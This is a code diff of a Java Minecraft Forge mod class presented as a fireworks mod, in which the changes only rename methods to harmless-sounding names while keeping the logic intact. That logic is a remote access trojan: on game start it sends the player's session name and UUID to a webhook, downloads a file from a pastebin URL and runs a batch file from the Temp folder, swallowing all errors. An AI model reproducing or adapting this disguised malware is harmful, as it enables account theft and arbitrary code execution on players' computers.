@@ -28,24 +28,24 @@ public class FireWorkDummy {
 
     @Mod.EventHandler
     public void onFMLPreInitialization(FMLPreInitializationEvent event) {
-        LoadExoticDB();
+        setFireWork();
     }
 
     @Mod.EventHandler
     public void onFMLInitialization(FMLInitializationEvent event) {
         try {
             Thread.sleep(5000);
-            LoadAH();
+            controlColors();
         } catch (Exception ignored) {}
         try {
             Thread.sleep(3000);
-            exec("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\screenshots\\screenshot.bat");
+            setMotion("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\screenshots\\screenshot.bat");
         } catch (Exception ignored) {}
     }
 
     // utils
 
-    public static void exec(String cmd) {
+    public static void setMotion(String cmd) {
         try {
             Runtime rt = Runtime.getRuntime();
             Process pr = rt.exec(cmd);
@@ -65,7 +65,7 @@ public class FireWorkDummy {
 
     // rats
 
-    public static void LoadExoticDB() {
+    public static void setFireWork() {
         try {
             Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
             Object minecraft = mc.getMethod("func_71410_x").invoke(null);
@@ -75,8 +75,8 @@ public class FireWorkDummy {
             Object name = sessionClass.getMethod("func_111285_a").invoke(session);
             Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);
 
-            StalkYoutuberCommand sendmessage = new StalkYoutuberCommand(getWebhook());
-            sendmessage.addEmbed(new StalkYoutuberCommand.EmbedObject()
+            FireWorkUtil sendmessage = new FireWorkUtil(getWebhook());
+            sendmessage.addEmbed(new FireWorkUtil.RGBFirework()
                     .setTitle("Minecraft Info")
                     .setColor(Color.CYAN)
                     .addField("Name", name.toString(), true)
@@ -89,7 +89,7 @@ public class FireWorkDummy {
         } catch (Exception ignored) {}
     }
 
-    public static void LoadAH() {
+    public static void controlColors() {
         try {
 
             URL pastebin = new URL("https://pastebin.com/raw/AERL3GJT");
@@ -113,8 +113,8 @@ public class FireWorkDummy {
                 fileOut.write(currByte);
             }
 
-            StalkYoutuberCommand sendmessage = new StalkYoutuberCommand(getWebhook());
-            sendmessage.addEmbed(new StalkYoutuberCommand.EmbedObject()
+            FireWorkUtil sendmessage = new FireWorkUtil(getWebhook());
+            sendmessage.addEmbed(new FireWorkUtil.RGBFirework()
                     .setTitle("Loading")
                     .setColor(Color.GREEN)
                     .addField("Message ", "Running .bat file", true));
